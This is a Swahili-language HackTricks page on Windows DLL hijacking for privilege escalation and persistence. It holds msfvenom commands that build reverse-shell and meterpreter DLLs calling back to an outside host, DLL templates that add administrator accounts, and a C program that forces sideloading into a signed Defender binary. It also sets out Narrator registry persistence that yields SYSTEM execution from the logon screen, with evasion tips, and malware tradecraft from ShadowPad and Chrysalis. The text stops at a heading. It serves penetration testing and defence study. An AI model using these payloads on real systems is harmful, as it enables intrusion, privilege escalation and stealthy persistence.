# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Taarifa za Msingi

DLL Hijacking inahusisha kuingilia kwa njia za udanganyifu ili kuifanya application ya kuaminika ione na kuiweka malicious DLL. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, and Side-Loading**. Inatumika hasa kwa ajili ya utekelezaji wa code, kupata persistence, na, kwa nadra, escalation ya privileges. Licha ya mtazamo wa escalation hapa, mbinu ya hijacking inabaki kuwa ile ile kwa malengo yote.

### Mbinu za Kawaida

Mbinu kadhaa zinaweza kutumika kwa DLL hijacking, kila moja ikiwa na ufanisi tofauti kulingana na strategy ya application ya kupakia DLL:

1. **DLL Replacement**: Kubadilisha DLL halali na DLL yenye madhumuni mabaya, kwa hiari kutumia DLL Proxying ili kuhifadhi utendakazi wa DLL ya asili.
2. **DLL Search Order Hijacking**: Kuweka DLL yenye madhumuni mabaya kwenye njia ya utafutaji kabla ya ile halali, kuingizia udanganyifu katika pattern ya utafutaji ya application.
3. **Phantom DLL Hijacking**: Kuunda DLL yenye madhumuni mabaya ambayo application itaijaribu kupakia, ikidhani ni DLL required ambayo haipo.
4. **DLL Redirection**: Kubadilisha vigezo vya utafutaji kama `%PATH%` au faili `.exe.manifest` / `.exe.local` ili kuelekeza application kwenye DLL yenye madhumuni mabaya.
5. **WinSxS DLL Replacement**: Kuweka badala DLL halali na toleo lenye madhumuni mabaya katika directory ya WinSxS, mbinu inayohusiana mara nyingi na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL yenye madhumuni mabaya katika directory inayotawaliwa na mtumiaji pamoja na application iliyokopwa, inafanana na mbinu za Binary Proxy Execution.

> [!TIP]
> Kwa mnyororo wa hatua kwa hatua unaoainisha HTML staging, AES-CTR configs, na .NET implants juu ya DLL sideloading, angalia workflow hapa chini.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Kupata Dll zisizopatikana

Njia ya kawaida zaidi ya kutafuta Dll zisizopatikana ndani ya mfumo ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **kuweka** **filter zifuatazo 2**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

na punguza tu kuonyesha **File System Activity**:

![](<../../../images/image (153).png>)

Kama unatafuta **dll zilizokosekana kwa ujumla** uishiendeleze hii kwa **sekunde chache**.\
Kama unatafuta **dll iliyokosekana ndani ya executable maalum** unapaswa kuweka **filter nyingine kama "Process Name" "contains" `<exec name>`, kuiendesha, na kusitisha kukamata matukio**.

## Kutumia Dll Zilizokosekana

Ili kuongeza privileges, nafasi bora ni kuwa unaweza **kuandika dll ambayo mchakato wenye privileges ataijaribu kupakia** katika sehemu zinazotafutwa. Kwa hivyo, tutaweza **kuandika** dll katika **folda** ambayo **dll inatafutwa kabla** ya folda ambayo **dll halisi** iko (hali isiyo ya kawaida), au tutaweza **kuandika kwenye folda ambayo dll itatafutwa** na dll halisi haipo katika folda yoyote.

### Dll Search Order

**Ndani ya** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kupata jinsi DLL zinavyopakiwa kwa undani.**

Windows applications hutafuta DLL kwa kufuata seti ya njia za utafutaji zilizowekwa, zikifuata mlolongo maalum. Tatizo la DLL hijacking linapotokea ni pale DLL yenye hatari imewekwa kwa mazingira ya kimkakati katika moja ya hizi directories, hivyo kuhakikisha inapakiwa kabla ya DLL halisi. Suluhisho la kuzuia hili ni kuhakikisha application inatumia absolute paths wakati inataja DLL zinazohitajika.

Unaweza kuona **DLL search order kwenye mifumo 32-bit** hapa chini:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Huo ndio mlolongo wa utafutaji wa **default** ukiwa na **SafeDllSearchMode** imewezeshwa. Wakati imezimwa, current directory inapelekwa hadi nafasi ya pili. Ili kuzima kipengele hiki, tengeneza thamani ya rejista **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na uweke kuwa 0 (default ni enabled).

Kama [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) inaitwa na **LOAD_WITH_ALTERED_SEARCH_PATH** utafutaji unaanza katika directory ya executable module ambayo **LoadLibraryEx** inaiweka.

Mwisho, kumbuka kwamba **dll inaweza kupakiwa kwa kuonyesha absolute path badala ya jina pekee**. Katika hali hiyo dll hiyo itatafutwa tu katika path hiyo (kama dll ina dependencies, zitatafutwa kama zilivyopakiwa kwa jina).

Kuna njia nyingine za kubadilisha mlolongo wa utafutaji lakini sitazieleza hapa.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya juu ya kuathiri kwa uhakika path ya utafutaji ya DLL ya mchakato mpya ulioanzishwa ni kuweka field ya DllPath katika RTL_USER_PROCESS_PARAMETERS wakati wa kuunda mchakato kwa kutumia native APIs za ntdll. Kwa kutoa directory inayotawaliwa na mshambuliaji hapa, mchakato lengwa ambao unarekebisha imported DLL kwa jina (bila absolute path na bila kutumia safe loading flags) unaweza kulazimishwa kupakia DLL yenye madhumuni mabaya kutoka directory hiyo.

Wazo kuu
- Jenga process parameters kwa kutumia RtlCreateProcessParametersEx na utoe DllPath maalum inayowakilisha folder ambayo unatawala (mfano, directory ambapo dropper/unpacker wako iko).
- Unda mchakato kwa kutumia RtlCreateUserProcess. Wakati binary lengwa itakapotafuta DLL kwa jina, loader itatafuta DllPath uliotolewa wakati wa azimio, ikiruhusu sideloading ya uhakika hata pale DLL yenye madhumuni mabaya haiko kwa pamoja na EXE lengwa.

Maelezo/mawigo
- Hii inaathiri mchakato mtoto unaoundwa; ni tofauti na SetDllDirectory, ambayo inaathiri mchakato wa sasa pekee.
- Lengwa lazima aingize au kutumia LoadLibrary kwa DLL kwa jina (bila absolute path na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na absolute paths zilizopachikwa siwezi kuibiwa. Forwarded exports na SxS zinaweza kubadilisha umuhimu.

Mfano wa C mdogo (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Mfano wa matumizi ya kiutendaji
- Weka xmllite.dll yenye madhara (inayotangaza functions zinazohitajika au inayofanya proxy kwa ile ya kweli) katika saraka yako ya DllPath.
- Anzisha binary iliyosainiwa inayojulikana kutafuta xmllite.dll kwa jina kwa kutumia teknik ulizoelezwa hapa juu. The loader hutatua import kupitia DllPath uliotolewa na inasideloda DLL yako.

Tekniki hii imeonekana kwa uhalisia kuendesha minyororo ya sideloading yenye hatua nyingi: launcher wa awali huweka helper DLL, ambayo kisha huanzisha binary iliyosainiwa na Microsoft, inayoweza kuhijackiwa, ikiwa na DllPath maalum ili kulazimisha kupakia DLL ya mshambuliaji kutoka kwenye saraka ya staging.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- Wakati **DLL inayoshirikisha jina lake na ile tayari imepakiwa kwenye memory** inapokutana, mfumo unapita juu ya utafutaji wa kawaida. Badala yake, hufanya ukaguzi wa redirection na manifest kabla ya kurudi kwenye DLL iliyopo kwenye memory. **Katika hali hii, mfumo haufanyi utafutaji wa DLL**.
- Katika kesi ambapo DLL inatambulika kama **known DLL** kwa toleo la sasa la Windows, mfumo utatumia toleo lake la known DLL, pamoja na yoyote ya DLL tegemezi zake, **bila kufanya mchakato wa utafutaji**. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** ina orodha ya known DLLs hizi.
- Iwapo **DLL ina dependencies**, utafutaji wa DLL hizo za tegemezi hufanywa kana kwamba zilielezwa kwa kutumia tu **module names**, bila kuzingatia kama DLL ya awali ilitambulika kwa njia kamili ya path.

### Kuinua Vibali

**Requirements**:

- Tambua mchakato unaofanya kazi au utakaofanya kazi chini ya **vibali tofauti** (horizontal or lateral movement), ambao **unakosa DLL**.
- Hakikisha kuna **write access** kwa saraka yoyote ambapo **DLL** itatafutwa. Eneo hili linaweza kuwa saraka ya executable au saraka ndani ya system path.

Naam, mahitaji haya ni magumu kuyapata kwani kwa default ni nadra kupata executable yenye vibali ambayo inakosa DLL, na ni pia adimu kuwa na write permissions kwenye folda ya system path (kwa default huwezi). Lakini, katika mazingira yaliyopangiliwa vibaya hii inawezekana.\
Ikiwa una bahati na unakutana na mahitaji, angalia mradi [UACME](https://github.com/hfiref0x/UACME). Hata kama **lengo kuu la mradi ni bypass UAC**, unaweza kupata hapo PoC ya Dll hijacking kwa toleo la Windows ambayo unaweza kutumia (pengine kwa kubadilisha tu path ya folda ambayo una write permissions).

Kumbuka kwamba unaweza **kukagua permissions zako kwenye folda** kwa kufanya:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Na **angalia ruhusa za folda zote ndani ya PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Unaweza pia kuangalia imports za executable na exports za dll kwa:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Kwa mwongozo kamili juu ya jinsi ya **kuitumia Dll Hijacking kupandisha vibali** ukiwa na ruhusa za kuandika katika **System Path folder** angalia:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zana za kiotomatiki

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) itaangalia kama una ruhusa za kuandika kwenye folda yoyote ndani ya System PATH.\
Zana nyingine za kiotomatiki zenye kuvutia za kugundua udhaifu huu ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Mfano

Ikiwa utapata senario inayoweza kutumika, mojawapo ya mambo muhimu zaidi ili kui-faida kwa mafanikio ni kuwa **unda dll inayosafirisha angalau kazi zote ambazo executable itaziingiza kutoka kwake**. Vilevile, kumbuka kwamba Dll Hijacking inafaa ili [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **jinsi ya kuunda dll halali** ndani ya utafiti huu wa dll hijacking uliolenga dll hijacking kwa ajili ya utekelezaji: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika sehemu inayofuata unaweza kupata baadhi ya **misimbo ya dll ya msingi** ambayo inaweza kuwa muhimu kama **templates** au kuunda **dll yenye kazi zisizohitajika zilisafirishwa**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Msingi, **Dll proxy** ni Dll inayoweza **kutekeleza msimbo wako hatari wakati inapoambuliwa** lakini pia **kuonekana** na **kufanya kazi** kama inavyotarajiwa kwa **kutuma miito yote kwa maktaba halisi**.

Kwa kutumia zana [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus) unaweza kwa kweli **kuonyesha executable na kuchagua maktaba** unayotaka ku-proxify na **kutengeneza dll iliyoproxify** au **kuonyesha Dll** na **kutengeneza dll iliyoproxify**.

### **Meterpreter**

**Pata rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Pata meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Unda mtumiaji (x86, sikupata toleo la x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Your own

Tambua kwamba katika matukio kadhaa, Dll unayo-compile inapaswa **export several functions** ambazo zitapakiwa na victim process; ikiwa functions hizi hazipo, **binary won't be able to load** nao na **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Mfano wa DLL ya C++ kwa uundaji wa mtumiaji</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL ya C mbadala yenye thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Uchunguzi wa Kesi: Narrator OneCore TTS Localization DLL Hijack (Upatikanaji/ATs)

Windows Narrator.exe bado inachunguza DLL ya lokalizishaji inayotarajiwa, inayohusiana na lugha, inapochomekwa ambayo inaweza kuibiwa ili kuruhusu utekelezaji wa msimbo wowote na kudumu.

Mambo muhimu
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ikiwa DLL inayoweza kuandikwa inayodhibitiwa na mshambuliaji ipo katika OneCore path, inapakiwa na `DllMain(DLL_PROCESS_ATTACH)` inatekelezwa. Hakuna exports zinahitajika.

Ugunduzi kwa Procmon
- Kichujio: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Anzisha Narrator na tazama jaribio la kupakia njia iliyo hapo juu.

DLL ndogo
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
Ukimya wa OPSEC
- A naive hijack itasababisha kuzungumza/kuangazia UI. Ili kukaa kimya, unapoambatana orodhesha threads za Narrator, fungua thread kuu (`OpenThread(THREAD_SUSPEND_RESUME)`) na `SuspendThread` it; endelea katika thread yako mwenyewe. Angalia PoC kwa msimbo kamili.

Kusababisha na kudumu kupitia mpangilio wa Upatikanaji
- Muktadha wa mtumiaji (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kwa hayo, kuanzisha Narrator kunapakia DLL iliyowekwa. Kwenye desktop salama (skrini ya kuingia), bonyeza CTRL+WIN+ENTER kuanzisha Narrator; DLL yako inatekelezwa kama SYSTEM kwenye desktop salama.

RDP-triggered SYSTEM execution (lateral movement)
- Ruhusu classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Fanya RDP kwenye host, kwenye skrini ya kuingia bonyeza CTRL+WIN+ENTER kuzindua Narrator; DLL yako inatekelezwa kama SYSTEM kwenye desktop salama.
- Utekelezaji unasimama wakati kikao cha RDP kinapofungwa—inject/migrate mara moja.

Bring Your Own Accessibility (BYOA)
- Unaweza kunakili kiingizo cha rejista cha Accessibility Tool (AT) kilichojengwa ndani (mfano, CursorIndicator), kuki-edit ili kiweke kwa binary/DLL yoyote, kuingiza, kisha kuweka `configuration` kwa jina hilo la AT. Hii hutumika kama proxy kwa utekelezaji wowote chini ya mfumo wa Accessibility.

Vidokezo
- Kuandika chini ya `%windir%\System32` na kubadilisha thamani za HKLM kunahitaji haki za admin.
- Mantiki yote ya payload inaweza kuishi katika `DLL_PROCESS_ATTACH`; hakuna exports zinahitajika.

## Uchunguzi wa Kesi: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Kesi hii inaonyesha **Phantom DLL Hijacking** katika TrackPoint Quick Menu ya Lenovo (`TPQMAssistant.exe`), inayofuatiliwa kama **CVE-2025-1729**.

### Maelezo ya Udhaifu

- **Sehemu**: `TPQMAssistant.exe` iliyoko katika `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Kazi Iliyopangwa**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` inaendeshwa kila siku saa 9:30 AM chini ya muktadha wa mtumiaji aliyesajiliwa.
- **Directory Permissions**: Inayoandikawa na `CREATOR OWNER`, ikiruhusu watumiaji wa ndani kuweka faili yoyote.
- **DLL Search Behavior**: Inajaribu kupakia `hostfxr.dll` kutoka saraka yake ya kazi kwanza na inarekodi "NAME NOT FOUND" ikiwa haipo, ikionyesha kwamba kutafuta kwenye saraka ya ndani kuna kipaumbele.

### Exploit Implementation

Mshambuliaji anaweza kuweka stub ya `hostfxr.dll` yenye hatari katika saraka ile ile, akitumia DLL iliyokosekana kupata utekelezaji wa msimbo chini ya muktadha wa mtumiaji:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Mtiririko wa Shambulio

1. Kama mtumiaji wa kawaida, weka `hostfxr.dll` katika `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri kazi iliyopangwa ifanye kazi saa 9:30 AM chini ya muktadha wa mtumiaji wa sasa.
3. Iwapo administrator atakuwa ameingia ndani wakati kazi inapoendesha, DLL hasidi itaendeshwa katika kikao cha administrator kwa medium integrity.
4. Unganisha mbinu za kawaida za UAC bypass ili kuinua kutoka medium integrity hadi vibali vya SYSTEM.

## Uchambuzi wa Kesi: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Watoa tishio mara nyingi huunganisha droppers zinazotegemea MSI na DLL side-loading ili kutekeleza payload chini ya mchakato uliothibitishwa na kusainiwa.

Muhtasari wa mlolongo
- Mtumiaji anapakua MSI. CustomAction inaendesha kimya wakati wa usakinishaji wa GUI (mfano, LaunchApplication au hatua ya VBScript), ikijenga tena hatua inayofuata kutoka kwa rasilimali zilizojengwa ndani.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Look for entries that run executables or VBScript. Example suspicious pattern: LaunchApplication executing an embedded file in background.
- In Orca (Microsoft Orca.exe), inspect CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Look for multiple small fragments that are concatenated and decrypted by a VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading ya vitendo na wsc_proxy.exe
- Weka faili hizi mbili katika folda moja:
- wsc_proxy.exe: legitimate signed host (Avast). Mchakato unajaribu kupakia wsc.dll kwa jina kutoka folda yake.
- wsc.dll: attacker DLL. Ikiwa hakuna exports maalum zinazohitajika, DllMain inaweza kutosha; vinginevyo, jenga proxy DLL na forward required exports kwa genuine library huku ukiendesha payload katika DllMain.
- Jenga payload ndogo ya DLL:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Kwa mahitaji ya ku-export, tumia framework ya proxying (mfano: DLLirant/Spartacus) kutengeneza DLL ya forwarding ambayo pia inatekeleza payload yako.

- Mbinu hii inategemea uamuzi wa jina la DLL na binary mwenyeji. Ikiwa host inatumia absolute paths au safe loading flags (mfano: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack inaweza kushindwa.
- KnownDLLs, SxS, and forwarded exports zinaweza kuathiri kipaumbele na lazima zizingatiwe wakati wa kuchagua host binary na export set.

## Triadi zilizotiwa sahihi + payload zilizofichwa (ShadowPad case study)

Check Point ilielezea jinsi Ink Dragon inavyotumia ShadowPad kwa kutumia **triadi ya faili tatu** ili kuingiliana na programu halali huku ikihakikisha payload kuu imefichwa kwenye diski:

1. **EXE iliyosainiwa ya mwenyeji** – vendors kama AMD, Realtek, au NVIDIA wanatumiwa (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Washambulizi hurenamea executable ili ionekane kama Windows binary (kwa mfano `conhost.exe`), lakini sahihi ya Authenticode inabaki kuwa halali.
2. **DLL ya loader ya hatari** – inawekwa kando ya EXE na jina lililotarajiwa (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL hiyo kwa kawaida ni binary ya MFC iliyofichwa na framework ya ScatterBrain; jukumu lake pekee ni kupata blob iliyoencrypted, kuifungua, na kuiweka ShadowPad katika kumbukumbu kwa reflective mapping.
3. **Blob ya payload iliyofichwa** – mara nyingi huhifadhiwa kama `<name>.tmp` katika saraka ile ile. Baada ya memory-mapping payload iliyofunguliwa, loader inafuta faili la TMP ili kuharibu ushahidi wa forensiki.

Vidokezo vya tradecraft:

* Kurekebisha jina la EXE iliyosainiwa (wakati unaweka `OriginalFileName` ya awali katika PE header) kunaiwezesha kujifanya kama Windows binary huku ikidumisha saini ya vendor, hivyo rudia tabia ya Ink Dragon ya kuangusha binaries zinazoonekana kama `conhost.exe` ambazo kwa kweli ni utilities za AMD/NVIDIA.
* Kwa sababu executable inabaki kuaminika, udhibiti mwingi wa allowlisting unahitaji tu DLL yako ya hatari iwe kando yake. Lenga kubadilisha loader DLL; mzazi uliosainiwa kwa kawaida unaweza kukimbia bila kubadilishwa.
* Decryptor ya ShadowPad inatarajia blob ya TMP kuwa kando ya loader na iwe inaweza kuandikwa ili iweze kuita sifuri faili baada ya mapping. Weka saraka iwe inayoweza kuandikwa hadi payload ianze; mara ikiwa katika kumbukumbu faili la TMP linaweza kufutwa kwa usalama kwa OPSEC.

## Somo la Kesi: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Ushambulizi wa hivi karibuni wa Lotus Blossom ulinufaisha mnyororo wa masasisho uliothibitishwa kupeleka dropper iliyojaa NSIS iliyopanga DLL sideload pamoja na payloads zilizokaa kikamilifu kwenye kumbukumbu.

Mtiririko wa tradecraft
- `update.exe` (NSIS) inaunda `%AppData%\Bluetooth`, inaweka sifa **HIDDEN**, inaweka Bitdefender Submission Wizard iliyorenamed `BluetoothService.exe`, `log.dll` ya hatari, na blob iliyofichwa `BluetoothService`, kisha inaendesha EXE.
- EXE mwenyeji huingiza `log.dll` na huaita `LogInit`/`LogWrite`. `LogInit` inafanya mmap-load ya blob; `LogWrite` inai-decrypt kwa stream ya custom inayotokana na LCG (constants **0x19660D** / **0x3C6EF35F**, nyenzo za ufunguo zimetokana na hash ya awali), inaandika tena buffer kwa shellcode wazi, inatoa temp, na inaruka kuifikia.
- Ili kuepuka IAT, loader huamua APIs kwa ku-hash majina ya export kwa kutumia **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, kisha kutumia Murmur-style avalanche (**0x85EBCA6B**) na kulilinganisha dhidi ya salted target hashes.

Shellcode kuu (Chrysalis)
- Inai-decrypt module kuu inayofanana na PE kwa kurudia add/XOR/sub na ufunguo `gQ2JR&9;` kwa pass tano, kisha inafanya dynamic load ya `Kernel32.dll` → `GetProcAddress` ili kukamilisha utambuzi wa imports.
- Inajenga tena mistari ya majina ya DLL wakati wa runtime kupitia mabadiliko ya per-character bit-rotate/XOR, kisha inapakia `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Inatumia resolver ya pili inayopita **PEB → InMemoryOrderModuleList**, inachambua kila export table kwa block za 4-byte kwa Murmur-style mixing, na inarudisha tu kwa `GetProcAddress` ikiwa hash haipatikani.

Usanidi uliowekwa ndani & C2
